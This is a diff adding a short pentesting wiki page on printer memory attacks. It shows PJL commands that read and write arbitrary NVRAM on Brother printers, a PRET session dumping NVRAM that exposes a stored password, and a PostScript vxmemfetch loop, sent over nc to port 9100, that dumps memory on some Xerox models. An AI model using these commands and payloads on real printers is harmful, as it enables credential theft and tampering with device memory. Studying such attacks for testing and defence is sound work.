@@ -1,0 +1,38 @@
+# Memory Access
+
+**You can try to dump the NVRAM and extract confidential info \(as passwords\) from there.**
+
+In **PJL \(Brother\)** you can access **arbitrary NVRAM addresses** using PJL as shown below:
+
+```bash
+@PJL RNVRAM ADDRESS = X              # read byte at location X
+@PJL WNVRAM ADDRESS = X DATA = Y     # write byte Y to location X
+```
+
+You can test this attack using [**PRET**](https://github.com/RUB-NDS/PRET):
+
+```bash
+./pret.py -q printer pjl
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> nvram dump
+Writing copy to nvram/printer
+................................................................................
+................................................................................
+............................................MyS3cretPassw0rd....................
+................................................................................
+```
+
+Certain **Xerox printer models** have a proprietary **PostScript** `vxmemfetch` operator built into, which allows an attacker to read arbitrary memory addresses. Using a PostScript loop, this feature can be easily used to dump the whole memory as show below \(PRET doesn't have this attack so you will need to send this payload to the port 9100 in a `nc` connection\):
+
+```text
+/counter 0 def 50000 {
+  /counter counter 1 add def
+  currentdict /RRCustomProcs /ProcSet findresource begin
+  begin counter 1 false vxmemfetch end end == counter
+} repeat
+```
+
+**More information here:** [**http://hacking-printers.net/wiki/index.php/Memory\_access**](http://hacking-printers.net/wiki/index.php/Memory_access)\*\*\*\*
+
